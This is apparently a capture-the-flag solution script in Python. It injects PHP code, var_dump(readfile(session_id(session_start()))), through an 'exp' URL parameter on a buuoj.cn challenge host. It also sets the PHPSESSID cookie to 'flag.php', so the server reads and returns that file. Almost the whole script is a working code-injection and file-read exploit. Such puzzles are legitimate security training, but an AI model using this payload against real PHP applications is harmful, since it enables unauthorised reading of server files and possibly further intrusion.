import requests
from requests_toolbelt.utils import dump
payload = "flag.php"
cookies = { "PHPSESSID":payload }

r = requests.post('http://202d1994-6d13-4148-acd5-4c180d71ec60.node3.buuoj.cn/?exp=var_dump(readfile(session_id(session_start())));',cookies=cookies)
data = dump.dump_all(r)
print(data.decode("utf-8"))
print("==========================")
print(r.content)